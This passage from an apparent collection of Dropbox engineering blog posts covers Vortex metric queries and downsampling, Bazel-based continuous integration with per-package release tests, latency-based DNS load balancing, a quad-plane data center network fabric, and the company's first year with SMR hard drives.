metric and the main metric can be used interchangeably, as if they had all been reported on the same metric. To disambiguate them, tags originating from the topology are prefixed with an @ as well. For example: Copy courier/server/request_latency_ms[_p, @kernel]@node{_task=\"vortex_query\", _p=\"p75|p95\"} This query makes use of the node topology, which reports node-level stats such as the kernel version, the revision and class of the hardware, etc. This particular query is used to compare the p75 and p95 latencies of serving queries compared by kernel version. Copy exception_log/exceptions[severity, @revision]@yaps{@service=\"vortex_query\"} | per_second This query makes use of the YAPS (Yet Another Push System) topology, which reports all packages deployed to a node. In particular, this query returns the number of exceptions for the Vortex query service broken down by severity and the Git revision of the running code, so it can be used when rolling out updates to compare error rates. Metric streaming Since each query cache stores thousands of queries, it likely ends up receiving forwarded metric buckets from MetricCollectors on behalf of most of the nodes in the fleet. The following diagram represents the flow of data: In this example, we’ve shown only a single query cache machine, although in reality there are many partitions of query caches. Within the query cache (although only three are shown above) there are thousands of cached queries. Each bucket on the left represents the data coming from a single node. When the data is streamed, all data from a node for a certain timestamp is grouped together; this is important, since the topology metrics are used to route the query. For example, query 2 groups (breaks down) the requests metric by the @kernel tag that came from the topology. The buckets on the left are identified with their node_id, which can also be used as a tag (as seen in query 3). Any tags that aren’t specified in a group-by or filter are aggregated away. For example, all three data points from the top bucket are aggregated into a single sample in the top row of query 2. Query warmer To take full advantage of the query caching, we run a service that prewarms queries that it finds on service dashboards. This ensures that when engineers open dashboards to investigate issues, their queries are served in milliseconds and they don't waste precious time waiting for data to load. Downsampling As with any time-series database, Vortex performs downsampling of historical data as an optimization of performance and storage. Data is downsampled from 10-second granularity to 3 minutes, then 30 minutes, and finally 6 hours. We keep each lower granularity for progressively longer periods (six-hour data is retained forever), and at query time we choose a sampling rate such that we return a maximum of roughly 1,000 data points. This keeps the performance of queries roughly constant even as the time range is adjusted. Conclusion In this post, we’ve described the design of our next-generation monitoring system. We’ve already scaled this system past the limits of the old system, and our users benefit from faster queries and higher trust in the system working correctly. We’ve successfully ingested more than 99.999% of reported buckets in the last few months, and our job orchestrator has replaced hundreds of failed hosts with no human intervention or disruption in service. In the next few months, we will continue to deliver new functionality and other improvements to our users, including recording rules, super-high cardinality metrics that can be selectively exported and persisted on the fly, integration with desktop and mobile client reporting libraries, a new metric type (a set cardinality estimator), and new query language features. With this work, we will continuously optimize our ability to gain insight into how our server applications (and downstream, our core products) are behaving. Interested in joining us and working on Vortex or other interesting challenges? We’re hiring! // Tags Infrastructure Monitoring Vortex // Copy link Link copied Link copied", "date": "2019-11-14"},
{"website": "Dropbox", "title": "Continuous integration and deployment with Bazel", "author": ["Benjamin Peterson"], "link": "https://dropbox.tech/infrastructure/continuous-integration-and-deployment-with-bazel", "abstract": "Dropbox server-side software lives in a large monorepo. One lesson we’ve learned scaling the monorepo is to minimize the number of global operations that operate on the repository as a whole. Years ago, it was reasonable to run our entire test corpus on every commit to the repository. This scheme became untenable as we added more tests. One obvious inefficiency is the pointless and wasteful execution of tests that can’t possibly be affected by a particular change. We addressed this problem with the help of our build system. Code in our monorepo is built and tested exclusively with Bazel . Abstractly, Bazel views the repository as a set of targets (files, binaries, libraries, tests, etc.) and the dependencies between them. In particular, Bazel knows the dependency graph between all source files and tests in the repository. We modified our continuous integration system to extract this dependency information from Bazel (via bazel query ) and use it to compute the set of tests affected by a particular commit. This allows us to greatly reduce the number of tests executed on most commits while still being correct. Since a particular test no longer runs on every commit, we use its previous history to determine its status on commits where it didn’t run. If a test runs on commit N but isn’t affected by commit N+1, we can consider the test to have the same status on both commits. In this way, we propagate a status for every test in the repository for every commit that it exists in. To conserve extra resources, we don’t run all affected tests on all commits. We roll up the set of affected tests for the commits in a fixed time period by computing the union of the set of affected tests over each commit in the period. Then, we execute the rolled-up set of affected tests for that period on the last commit in the period. The time between rollup builds is a tunable parameter trading resource usage against test result timeliness. This batching could hamper breakage detection because the first commit to observe a test failure may not actually be culpable. However, our automated breakage detection system, Athena , is able to bisect failing tests over the entire rollup period to find the precise broken change. Our production deployment system distributes software to hosts in the form of SquashFS images. We have a custom Bazel rule that builds SquashFS images for the deployment system to consume. We generally require that software pass its tests before being pushed into our production environment. This requirement is enforced by our deployment system. Historically, we allowed pushing software from a particular commit only if all tests in the repository passed on it, either by being directly run on the commit or through propagation from previous commits. While simple, this model doesn’t scale well. It’s frustrating to have deployment blocked because a completely unrelated test is failing. Even if all tests pass, repository growth over time means takes longer and longer to prove that a particular commit is completely green, despite running only affected tests on each commit. To break down the old “monolithic green” system, we allow every deployable package to specify “release tests”, the set of tests required to pass before pushing it. The test set is described using a subset of Bazel’s target pattern syntax . For example, deploying a simple C++ ping server at Dropbox might have a Bazel BUILD file like this: Copy cc_library(\n     name = \"ping_lib\",\n     srcs = [\"ping.cc\"],\n)\n\ncc_binary(\n    name = \"ping_server\",\n    srcs = [\"ping_server.cc\"],\n    deps = [\":ping_lib\"],\n)\n\ncc_test(\n    name = \"ping_test\",\n    srcs = [\"ping_test.cc\"],\n    deps = [\":ping_lib\"],\n)\n\ndbx_pkg_sqfs(\n    name = \"ping_server.sqfs\",\n    data = [\n        \":server\",\n    ],\n    release_tests = [\n        \"//ping_server/...\",\n    ],\n) This file declares a C++ library, binary, and test using the standard built-in Bazel C++rules . The ping_server.sqfs target produces a SquashFS containing the ping_server binary. ping_server.sqfs would be deployable on commits where every test in //ping_server/ and its subpackages had passed. As mentioned previously, we conserve resources by aggregating test runs across several commit builds. This potentially introduces extra latency between when a commit lands and when it’s deployable. If an engineer makes a change to the ping server and wants to deploy it immediately, they can request that our continuous integration system run ping_server.sqfs‘s release tests as soon as their commit lands. This happens regardless of where the commit falls in the rollup period. We leave the decision of what to put in release_tests up to individual teams. It’s common to include a package’s own tests as well as the tests of critical dependency libraries. More conservative projects might include some of their reverse dependencies’ tests. When we were developing the release tests feature, we experimented with automatically generating the test set by inspecting the packaged code’s dependencies. However, we were unable to develop an intuitive heuristic that simultaneously included the tests people expected and meaningfully cut down the number of tests required to release a package. Interested in building great developer tools at scale? We’re hiring! // Tags Infrastructure Bazel // Copy link Link copied Link copied", "date": "2019-12-11"},
{"website": "Dropbox", "title": "Intelligent DNS based load balancing at Dropbox", "author": ["Nikita Shirokov"], "link": "https://dropbox.tech/infrastructure/intelligent-dns-based-load-balancing-at-dropbox", "abstract": "When geolocation load balancing doesn’t work How to improve DNS load balancing Building our map (initial version) Initial results Solving corner cases What comes next We’re hiring! Appendix A. Dropbox Open Peering Policy Appendix B. Visualization with Kepler.gl and h3 Appendix C. DNS ECS and user’s privacy The Dropbox Traffic team is charged with innovating our application networking stack to improve the experience for every one of our users—over half a billion of them. This article describes our work with NS1 to optimize our intelligent DNS-based global load balancing for corner cases that we uncovered while improving our point of presence (PoP) selection automation for our edge network. By co-developing the platform capabilities with NS1 to handle these outliers, we deliver positive Dropbox experiences to more users, more consistently. In our previous post about the D ropbox edge network , we were talking about geolocation-based load balancing. The idea behind this approach could be simply described as sending the user to our closest point of presence . Let’s try to decipher this statement: being sent in this context means that when a user is doing DNS request, we would reply with a specific Dropbox IP address. For different users, we reply with different IP addresses. With geolocation-based load balancing, the “closest” PoP is indeed the one which is closest in terms of distance from the user. In the picture below you can see how users are mapped to our edge PoPs. the mapping of users to Dropbox edge PoPs This map was generated by kepler.gl with the help of a database with IP to geolocation mappings. IP addresses were used to preserve the privacy of our users. Dropbox intentionally does not use any other information to determine user locations. This works for the majority of cases and has allowed us to scale our edge network to more than 20 edge clusters. However, there are some corner cases where geolocation does not work as intended (even on the map above you can see that sometimes a user is mapped to an unrealistic location). Let’s understand why. When geolocation load balancing doesn’t work The main drawback of geo routing is that it does not consider the network’s topology. For example, a user could be right next to our PoP but his ISP does not have any network interconnection with us in that location. The example below illustrates this situation. suboptimal geo-based routing geo-based routing vs optimal latency-based In this example, an ISP in Berlin ( TXL IATA code ) has a user. From the IPS’s geographical point of view, the closest PoP is in Berlin, but we don’t have any PNIs (private network interconnections) with the ISP there. In this situation, the ISP would need to use a transit provider to reach us. In some cases, the connection with the transit provider could be in other facilities where we do have a PoP as well, for instance Frankfurt (FRA). But instead of going through Frankfurt (TXL→FRA→TXL), the client’s traffic is looping back to Berlin (TXL→FRA→TXL→FRA→TXL). One way to solve the issue is setting up a PNI with an ISP in TXL. Dropbox has an open peering policy and highly benefits from direct interconnects. Although we are trying to find all such cases, it is unrealistic to track them all, and we still have corner cases, when geo routing does not work. Let’s look at some extreme examples of such suboptimal routing. example of suboptimal geo routing In this example users in Vladivostok, Russia (marked as a red square) are routed to our PoP in Tokyo (as you can see them from the geographical point of view they are right next to each other). The issue here is that most ISPs in Russia do not have any presence in Tokyo. Moreover, most of the transit connections happened in the west part of Russia. So in this example, 75th percentile of RTT between the user and a Dropbox frontend server is around 300-400 ms. For them to reach us their traffic must travel across the globe (e.g., Vladivostok→Moscow→Atlantic Ocean→USA→Pacific Ocean→Tokyo). How to improve DNS load balancing The best way to improve DNS load balancing and avoid such corner cases, is to “teach” it about your network topology. Instead of routing based on geographical “closeness,” we would use routing based on latency/network topology “closeness,” (the lower latency to the PoP → the closer it is). After obtaining such a route map (a user to PoP mapping) the next step is to teach your DNS server to use it. In our case, we collaborated with NS1 and added the ability to upload and use a custom DNS map on a per-record basis. Building our map (initial version) The question is, once we have a way to use a custom map to improve users’ routing, how could we build such a map? We already had the latency data between users’ subnet and our edge PoPs. (As we described in the previous article about our edge network, we have heavily invested in our desktop client framework so we can use it to run simple tests, e.g. measure latency between a client and every Dropbox edge cluster.) But for the DNS map we also need to get a mapping between a user’s subnet and the DNS resolver they are using. At this point, we want to briefly remind the reader about how DNS resolution works. The picture below shows the steps involved: The user opens www.dropbox.com in a browser or starts the Dropbox desktop client which attempt to resolve DNS record of www.dropbox.com to our IP address. This step involves sending a DNS query to the configured DNS resolver (usually the one, which the ISP provides) The DNS resolver iterates through requests to the authoritative DNS server for the dropbox.com zone (assuming it does not have cached reply for this entry; if it does, see step 4 below) The DNS server replies with the IP address of www.dropbox.com The ISP’s recursive DNS resolver replies to the end-user with an IP address for www.dropbox.com As you can see from the described process, the authoritative DNS server does not see the end user’s IP address, but the IP address of the user’s DNS resolver. (Recently, some public DNS resolvers started to provide DNS ECS extensions, but they are still not widely used. See appendix C.) We faced a problem of needing to know which DNS resolver a user is using. Fortunately, others have solved this problem (e.g. Facebook’s sonar/doppler ) and some solutions were already documented. In our case, we added a special test to our client framework, that does DNS queries to random subdomains of dropbox.com . By being random, we make sure that the user’s DNS resolver doesn’t have any cached replies and we force it to do a full DNS lookup. On our side, we are logging all requests to this subdomain, and getting a mapping between unique DNS name ↔ DNS resolver’s IP address. At the same time, our desktop client periodically reports back to us which unique DNS queries it has been issuing (we anonymize this data in our system as much as possible. For example, we do aggregate all this data by a subnet, but we do not log a user’s individual IP address). By joining these two sources of data we are getting information about the client’s subnet ↔ DNS resolver ↔ latency to the PoP . And this is all that we need to build an initial map for latency-based DNS routing: we know all the user’s information behind certain DNS resolvers, and latency of this user toward all of our PoPs. By doing a few transformations, we learn what is the best PoP for most of the users behind this DNS resolver (in our case we are calculating 75th percentile). The format of the map which NS1 expects is very simple: you just need to create a mapping between subnets (where DNS resolvers are located) and the PoP (which is identified by a configurable tag, in our case we are using IATA codes for tagging). The map itself should be serialized as a JSON message Copy {\n  \"meta\": {\n    \"version\": 1\n  },\n  \"map\": [\n    {\n      \"networks\": [\n        \"172.16.0.1/24\",\n        \"172.16.0.2/24\"\n      ],\n      \"labels\": [\n        \"fra\"\n      ]\n    },\n    {\n      \"networks\": [\n        \"172.16.0.3/24\",\n        \"172.16.0.4/24\"\n      ],\n      \"labels\": [\n        \"txl\"\n      ]\n    }\n  ]\n} As you can see, there is no user specific data in this map, only IP addresses/subnets of resolvers and where to send them. NS1, if configured, allows us to use multiple maps, and also supports DNS ECS matching (e.g. if an incoming request has ECS info about a user’s subnet, it would try to look up this subnet, and only fallback to the resolver’s IP address if this lookup fails). As the last step in our pipeline, we upload a map into NS1 using their API. Initial results We have started to deploy this map for our test domain and compare it to a geo-based DNS map. Almost immediately we saw around 10-15% latency improvement for our users (both for 75th and 95th percentile, with no negative effects at higher percentiles). Here is an example of how it improved our latency in Africa and US: geo vs latency routing in AF (p75) geo vs latency routing in US (p75) The next step was to get a PDF (probability density function) on exactly how much better a latency-based map is vs a geo-based one. We decided to compare the latency-based map vs anycast (we use anycast routing for apex record of dropbox.com ). latency-based routing p75 improvement vs geo/anycast. latency-based routing p75 improvement vs geo/anycast (zoomed) As you can see from the PDF graphs, around 10% of our user saw 2 ms improvements, 1% got around 20 ms improvements and “long tail” saw up to 200 ms and above. Overall, it looked like we had some benefit from latency-based routing almost everywhere (on a map bellow the brighter the hexagons are, the larger benefit in terms of latency of connection). latency-based DNS routing allows us to utilize existing PoPs better by getting more performance from the same infrastructure. improvements of latency-based routing by location Solving corner cases But the biggest source of these improvements was the fact that we were able to eliminate corner cases of geo-based routing. Let's revisit the example with Vladivostok from above. The different color means that we have started to route users to another PoP. In this example, instead of sending them across the world to Tokyo, we have started to route them to Frankfurt, which is one of the biggest internet exchange points in Europe. For Russian ISPs, this is one of the major locations to exchange traffic with other providers. For end-users, the latency went down from 300-400 ms to roughly 150. Let’s look into some other examples: Iceland With geo-based routing, we were sending users in Iceland to our PoP in Oslo, Norway. However, from the latency point of view, the best location for them is Amsterdam (another big internet exchange point in Europe). To be able to understand why Amsterdam is better, let’s look into the map of submarine cables (credit: TeleGeography and submarinecablemap.com ): map of submarine cables in Iceland As you can see from the picture above, there is no direct cable from Iceland to Norway. Instead, most of the network cables go to Denmark, which is much closer to the Netherlands (and Amsterdam) than Oslo. Using latency-based routing decreased the latency for users in Iceland by 10-15%. Another interesting example is Egypt: With geo routing, users in Egypt were being sent to our PoP in Milan, but with latency-based routing, they are now using Paris as the best location. To understand why, let’s again look at the submarine cables map: submarine cables map in Egypt submarine cables map in Egypt As you can see, most of them are going from Egypt to France. Latency-based routing once again allowed us to get a 10% benefit in terms of latency. If we look into Europe overall and compare geo vs latency-based routing we see another interesting fact: ISPs do prefer to peer with each other in a few big internet exchange points. You can see pretty straight borders with geo-based routing, however latency-based shows a different picture. Most of the ISPs in central Europe prefer to use Frankfurt to exchange traffic between each other. Also, the latency-based map shows how this routing allows us to fully utilize our PoP in Berlin (purple hexagons): with geo-based routing, we saw performance degradation for our users there (most likely because their ISPs have not had PNIs with us in Berlin). Because of that, with geo-based routing, we were using this PoP only for whitelisted ISPs. What comes next We just started to deploy a latency-based map in production, and this is just an initial version. There are lots of ways to improve it and make it much more intelligent. For example, right now the initial version does not consider any BGP policy (e.g. for specific ISPs to prefer locations with direct peering) and this is our top priority to implement in the next iteration of this project. Another interesting approach is to dynamically allocate users to the PoPs based on load (today we are using static weights, however, we are planning to add a feedback loop based on the actual usage of the PoP). We’re hiring! If you are still here, there is a high chance that you actually enjoy digging deep into the performance data and you may enjoy working at the Dropbox Traffic team! Dropbox has a globally distributed Edge network, terabits of traffic, and millions of requests per second. All of which is managed by a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and loadbalancers , HTTP/gRPC proxies , and our internal gRPC-based service mesh . Not your thing? Dropbox is also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . Appendix A. Dropbox Open Peering Policy ASN19679 on PeeringDB As mentioned in the post, Dropbox Edge Network is open for public peering in more than 30 locations. If you are looking for guaranteed capacity we are also available for private peering in most of the large peering facilities. Appendix B. Visualization with Kepler.gl and h3 Appendix C. DNS ECS and user’s privacy The DNS ECS extension works by taking a DNS query and using a recursive resolver to provide a subnet f or the user, on behalf of which it is doing the DNS resolution. However, this is still not very common. The m ost n otable DNS providers with ECS extension are Google and OpenDNS. . // Tags Infrastructure Traffic Performance Intelligence Edge Network // Copy link Link copied Link copied", "date": "2020-01-08"},
{"website": "Dropbox", "title": "The scalable fabric behind our growing data center network", "author": ["Vishal Sakpal"], "link": "https://dropbox.tech/infrastructure/the-scalable-fabric-behind-our-growing-data-center-network", "abstract": "Dropbox network physical footprint Legacy four-post architecture Scaling limitations and growth Cabling and optics Physical design and layout Why quad-plane? Non-blocking and oversubscription Colors and routing within the fabric Future scaling Dropbox needs its underlying network infrastructure to be reliable, high-performing, cost-effective, and truly scalable. In previous posts we described how the edge network was designed to improve user performance, and how the supporting multi-terabit backbone network spans continents to interconnect edge PoPs and multiple data centers. In this post we describe how we evolved the Dropbox data center network from the legacy chassis based four-post architecture to a scalable multi-tier, quad-plane fabric. Also, we successfully deployed our first fabric at our newest data center in California earlier this year! Dropbox network physical footprint Figure 1: Location of Dropbox global points of presence (PoPs) We currently have global network presence and multiple data centers in California, Texas and Virginia. From a redundancy perspective, the North American continent is carved into regions—East, Central, and West—thereby having a distributed data center approach and improving resiliency in events of failure. Legacy four-post architecture Figure 2: Four-post cluster architecture (CC = cluster connector, CR= cluster router) A cluster is comprised of ‘n’ rack switches and four supporting CR devices in a tier, and each CR device is a chassis based system. The cluster router (CR) tier handles inter-rack traffic within the cluster and traffic entering or leaving the cluster. Typically, a data center is comprised of more than one cluster, and interconnection between clusters is done via the cluster connector (CC) tier, itself comprised of four CC devices (see figure #2). The cluster connector (CC) tier handles inter-cluster traffic within the datacenter and is the entry/exit point for all traffic at a datacenter. We used 100G connectivity across all the links seen in the above figure. From a protocol perspective, we run eBGP between the cluster connector (CC) and cluster router (CR) tiers using private autonomous system numbers (ASN) numbers. In contrast, between a rack and cluster router (CR) we use iBGP and route-reflectors to propagate routing information within the cluster. Additionally, devices within the CC and CR tiers are fully meshed using ISIS as the IGP and peering via iBGP using loopback interfaces. Scaling limitations and growth As we kept adding megawatts of data center space to support growth, we quickly realized that the older four-post architecture wouldn’t be able to scale to meet our future needs. The port density on the chassis based units directly translated to the number of racks a cluster could support, making network infrastructure a limiting factor. Adding new clusters to an existing data center or upgrading cluster-uplink capacity meant having unused ports on the upstream aggregating CC-tier. Also, troubleshooting a traffic-related issue within a system using multiple line cards and supporting fabric modules could quickly become complex and time consuming. Keeping in mind the challenges with the older design, we wanted to ensure our next generation design solved them while remaining future-proof. Below are design considerations we focussed upon while engineering the fabric: Achieving a rack count greater than that offered by the legacy design Ability to scale horizontally while adding capacity on demand Non-blocking fabric with increased redundancy Chassis-free design Utilizing an identical ASIC at every tier All fabric links/interconnects utilize 100G connectivity Multiple ECMP options at every layer Quad-plane, 3-tier fabric: 16 racks per pod 16 pods per fabric 64 spine switches 4 pod switches per pod Figure 3: 256 rack fabric As seen above in figure #3, the spine connectors (SC) and spine switches (SSW) are the building blocks of the fabric, and the pod switches (PSW) can be added incrementally on-demand, allowing the design to be elegantly scaled horizontally. Each device above, including the rack switch, is using an identical ASIC that offers 3.2 Tbps of switching capacity (32 ports of 100G), with super-low latency, and has a single rack-unit footprint, while leveraging merchant silicon. Our latest deployment includes 16 pods, however this can be further scaled to support 31 pods thereby accommodating close to 500 racks. The number of pods in the fabric is dictated by the number of ports reserved on each spine switch (SSW) device. Based on our traffic patterns, we initially reserved fewer ports for upstream connectivity responsible for traffic entering and leaving the fabric. While accommodating for future growth, we can always increase the upstream capacity and appropriately scale the number of pods in the fabric. Cabling and optics As seen in figure #4 below, the new design resulted in a few thousand interconnections across the building blocks of the fabric itself, not accounting for the rack uplinks! Based on our physical layout these distances were within the operating limits of a QSFP-100G-SR4 optic. Hence, we deployed QSPF-100G-SR4 in a combination with MPO connectors over multimode fiber (MMF). The longest cable in the physical layout was roughly 140 feet, which spanned from the main distribution frame (MDF) to our farthest cabinet location (again within the operating limits of a QSFP-100G-SR4 optic). Figure 4: Zooming in on the fabric with few thousand interconnects Physical design and layout Figure 5: MDF row representation In addition to logical network failure domains, we decided to separate the planes across the two main distribution frame (MDF) rows, in our case MDF ‘A’ and MDF ‘B’ to add physical diversity. Simultaneously, this allowed us to increase our failure domain when dealing with electrical anomalies as each MDF row is supported by redundant electrical power distribution panels. Furthermore, each MDF row has diverse network pathways to each cabinet position. Figure 6: Physical representation of a small section of the fabric Why quad-plane? Figure 7: Quad-Plane design Our idea of a “plane\" reflects an independent failure domain. Based on our needs, each rack switch connecting to the fabric is offered 4X100G of uplink capacity, hence the term ‘quad-plane’. At any given time, we should be able to lose an entire plane’s worth of capacity and still remain healthy, this would mean losing one spine connector (SC), 16 spine switches (SSW) and 16 pod switches (PSW) identically colored. Non-blocking and oversubscription Non-blocking means that the number of inputs equals the number of outputs. It wasn’t a pre-requisite, but we preferred to utilize the fabric to its fullest potential starting on day one, and hence we constructed a non-blocking network with a 1:1 oversubscription ratio between any two racks within the fabric. This also helped us steer away from any potential speed mismatch related issues and simplified cabling by not needing to split a 100G port. Colors and routing within the fabric Every device and interconnect within the fabric is uniquely colored. Each color signifies a unique plane. A plane within the fabric is responsible for 25% of overall rack throughput. This further explains why no two different color devices are connected. Once a packet traverses a uniquely colored link or device, it will only further traverse identically colored links or devices. This applies to all traffic whether intra-fabric i.e rack-to-rack traffic or traffic exiting the fabric destined to networks external to the fabric, this is further illustrated in figure #8 and figure #9 respectively. Intra-fabric packet traversal: Figure 8: Intra-fabric, inter-pod packet traversal Networks external to fabric: Figure 9: Traffic destined to networks external to the fabric We built the fabric entirely on BGP, specifically running eBGP between any two devices. As compared to using iBGP and route-reflectors in the legacy design, eBGP helped us keep things simple and offers deeper visibility into a routing-prefix while leveraging AS-Path information. As in our older designs, the fabric is also a pure Layer 3 network down to the rack switch, offering support for IPv4 and IPv6. The fabric relies on equal-cost multi-path routing (ECMP) & per-flow hashing resulting in equal distribution of flows equally across available links. Failure domain analysis Pod switch (PSW): Figure10: A POD Switch failure Traffic profile: Handles both east↔west and north↔south flows If a PSW fails, all the rack switches in the pod lose upstream capacity by 25%, basically a failure domain of 75% This provides better fault isolation and reduces the impact to only a single pod, compared to the existing four-post design where all racks would lose upstream capacity by 25% Spine switch (SSW): Figure 11: A Spine Switch failure Traffic profile: Handles both east↔west and north↔south flows A spine switch (SSW) connects to 16 pod switches (PSW) and four spine connectors (SC). Losing a node out of 16 devices in a plane results in a failure domain of 93.75% which is really low as compared to a node failure in the four-post design wherein all racks in the cluster would lose upstream capacity by 25% Spine connector (SC): Figure 12: A Spine Connector Failure Traffic profile: Handles only north↔south flows A spine connector tier is comprised of four devices. Failure of a single device results in 25% loss of north↔south capacity resulting in a failure domain of 75% However, this failure only impacts flows entering/leaving the fabric. East↔west flows remain un-impacted! Future scaling The existing fabric design can scale close to 500 racks while operating in a non-blocking fashion. Making use of an ASIC that offers higher port density, say 64X100G, the existing fabric design can be scaled to support 4x the rack capacity, again non-blocking! As merchant silicon continues to evolve and produce denser chips, having much denser fabrics is very well a possibility. To accommodate relatively higher rack counts, a fabric may span multiple physical suites and outgrow the maximum supported distance on a QSFP-100G-SR4 optic which would require the need to explore potential transceivers: Parallel single mode 4-channel (PSM4) or coarse wavelength division multiplexing four-lane (CWDM4) or any future specifications to achieve connectivity across a fabric spanning physically separated facilities. We’re hiring! The Network Engineering team is hiring talented Network Engineers with a desire to build and solve problems at scale across Backbone, Datacenter, Edge, Optical, and much more. You’ll be a part of a small team that has a huge impact on the world. We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world Acknowledgements Implementing the new design would not have been possible without tightly-coupled collaborative efforts across the organization involving network engineering, network reliability engineering, cluster operations, supply chain, datacenter operations, finance, and technical program managers. A huge shoutout to all involved in making this effort a success! // Tags Infrastructure Hardware Data Fabric // Copy link Link copied Link copied", "date": "2019-01-23"},
{"website": "Dropbox", "title": "SMR: What we learned in our first year", "author": ["Magic Pocket Hardware Engineering Teams"], "link": "https://dropbox.tech/infrastructure/smr-what-we-learned-in-our-first-year", "abstract": "The Best Surprise Is No Surprise Software Updates Hardware Increasing Our Density Cost Savings Energy Savings Open Source Specific Challenges Cold Storage and SMR What the Future Holds A year ago, we became the first major tech company to adopt high-density SMR (Shingled Magnetic Recording) technology for our storage drives. At the time, we faced a challenge: while SMR offers major cost savings over conventional PMR (Perpendicular Magnetic Recording) drives, the technology is slower to write than conventional drives. We set out on a journey to reap the cost-saving benefit of SMR without giving up on performance. One year later, here’s the story of how we achieved just that. The Best Surprise Is No Surprise When the first production machines started arriving in September, it was only natural to have a little apprehension and think, “Does this actually work? What if it breaks?!” It was raw, completely new technology—it was terrifying. And then ... nothing happened. That is, everything simply worked. Not that this was much of a surprise. The lead-up to this event was the classic Dropbox story: Sweat the details, build confidence by relentlessly bashing out the bugs—and then roll the project out on a large scale. For the past three years, the Dropbox teams involved in the change over to SMR have been doing a lot of innovation—and more testing than any of us care to remember. The hardware team worked very tightly with the Magic Pocket software team , envisioning each possible edge case and running through every imaginable scenario. That diligent work helped ensure that the migration to the SMRs went off without a hitch. Software Updates To prepare for running SMR, we had to make substantial changes to the software layer. We optimized the software by improving the throughput of the networking stack to the disk. We also added an SSD cache: since you can only write to the SMR disks in fixed-size zones, and you can only write to them sequentially, we knew we needed an area to stage the writes. Adding support for this SSD staging layer to the software was specifically targeted for our transition to SMR, but it has helped latency in other cases, as well. Fortunately, we worked on a significant portion of the necessary software changes required for sequential writing ahead of time, testing our existing fleet of PMR disks. Before we even began to build the new architecture, we made sure it would support both PMR and SMR. This meant that the whole stack was thoroughly tested by the hundreds of thousands of installed disks before we even started bringing the SMR machines online. This removed a considerable amount of risk from the equation. All we had to do once we received the new machines was change the actual disk we were writing to. In the end, one aspect of our original design helped smooth the transition to SMR. The generic Dropbox infrastructure handles data in immutable blocks up to 4MB in size, which was convenient for SMR, since it allows random writes onto the disk sequentially into a new block. And the size of the write zones we’ve set up in Magic Pocket, with 1 GB extents of data, fit perfectly with the 256 MB zones used to split up SMR drives. Hardware Initially, SMR was a proof-of-concept case: can we actually make it function the way we want? From a hardware point of view, turning to SMR would help us build data storage density quicker than with PMR. What we found was that the use-case for SMR matched up very well with the way we’ve already architected Magic Pocket. But in comparison to the control we have over our own software stack for SMR, the hardware team had a massive hill to climb in terms of learning everything that went on in the background. One of the biggest challenges in enabling SMR for Dropbox was that it is a new technology in the data-center context. It was the healthy working relationship between the hardware team and the Magic Pocket team that allowed the project to be as successful as it turned out to be. Dropbox is not the only large tech company that’s working on calibrating and fine-tuning their software for SMR, but the use-case is so natural for us that we’ve been motivated to move quickly. Still, being first had its challenges—not least being the sheer amount of data we already manage. Our hardware team had very limited support when it came to preparing for SMR. The vendors selling the drives didn’t have the chassis configuration that we have—our current test cluster is about six racks, and there are 48 systems, or close to 5,000 drives. So when we iterated through our revisions, we were able to obtain a far better signal, which led to a stronger test process. And that helped put us at the bleeding edge of the technology: few companies have really invested in SMR, so we often ended up doing a lot of the testing for our vendors, which kept us a step ahead. Increasing Our Density One of our goals when embarking on the SMR initiative last year was to have 25 percent of our data storage capacity on SMR drives in 2019. Since September, all new drives for our storage servers are now SMR. Meanwhile, we’ve been able to continuously increase the density of our disk capacity faster than the growth of the data itself. At this rate, close to 40 percent of Dropbox’s data will be on SMR by the end of 2019, surpassing our predicted goal. Cost Savings Much like our data storage goals, the actual cost savings of switching to SMR have met our expectations. We’re able to store roughly 10 to 20 percent more data on an SMR drive than on a PMR drive of the same capacity at little to no cost difference. But we also found that moving to the high-capacity SMR drives we’re using now has resulted in more than a 20% percent savings overall compared to the last generation storage design. And we’re also realizing savings in part due to other new lower cost hardware. Meanwhile, our efforts to work with multiple vendors for the SMR drives will further benefit the entire Dropbox supply chain and Dropbox’s future storage cost structure. Energy Savings The transition to SMR has also made Dropbox a much more efficient energy consumer. SMR drives have a lower power footprint, so we’re realizing savings by using the new 14-terabyte drives compared to the previous 8-terabyte drives. In essence, we are working with much denser racks, but our power draw has increased only marginally. And we have been able to increase the number of storage disks from 60 to 100 on a single machine while maintaining the same CPU and memory. Thanks to these efficiencies, we expect to realize even further energy savings as we eventually move to 18, 21 and 24-terabyte drives. Open Source The library we use to write to the SMR drives is the open-sourced libzbc , and through the process of working with it and running into the occasional issue, we’ve made 13 contributions to the library. What’s more, we developed our own testing tool called SMRtest which generates synthetic workloads to write/read verify, and benchmark read/write throughput performance on SMR drives. We’ve already shared this tool with our ecosystem partners, suppliers, and vendors, to ensure they have what they need to enable SMR. And we’ll deploy SMRtest as open-source software in the coming months to benefit the wider community. Specific Challenges On the software side of things, we opted for more capacity, performance and flexibility by writing directly to the disks without a filesystem. Some operating systems are adding support for that, but when we were working with it, it wasn’t an option. So in order to talk to the disk, we used Libzbc— which is essentially a wrapper to send commands directly to the disk, without going through the Linux device or a block device stack. But during testing, we ran into the issue of the disk simply failing, over and over. It turned out the failures were due to a hardcoded loop—since we weren’t using Linux, whose kernel code includes retry logic, we had to implement our own retry logic around accessing the disk. Firmware was also another issue when it came to getting the SMR drive technology to work on the existing platform, largely because the components came from various vendors. We work with multiple hard-drive vendors, as well as various kinds of intermediary technologies, such as the host bus adaptor, to connect multiple drives to a system. Each one of these vendors—as well as the server chassis itself—operated with its own firmware. There were a lot of moving pieces, so the first initiative on the hardware side was to get our various partners and vendors to talk to each other. We then worked with each individual vendor to identify and resolve any issues early on, and all of the vendors have come forward and engaged with us. But we are convinced that this will pay dividends in the long term. Opting to be multi-source across all the components, for example, insulates us against any single points of failure or too much reliance on a single supplier from a supply chain perspective. Cold Storage and SMR One of the latest developments at Dropbox is the incorporation of a new cold storage tier, designed for less frequently accessed data. Depending on the replication scheme, we’ve managed to cut down on disk usage by 25 to 33 percent with no noticeable change to the end-user experience. Similarly, our cold storage system uses our current mix of SMR and PMR drives, which translates to additional cost-savings without any difference in performance. If you want to learn more about how we set up the cold tier, read Preslav Le’s recent blog post . What the Future Holds The simplicity of our infrastructure has also set us up to take advantage of all future innovations in data storage technology. The beauty of this approach, we believe, is that future technologies will likely use the same or similar API as SMR, where disks will be able to achieve greater densities by writing continuously to a limited number of zones of the disk at any given time. They may be 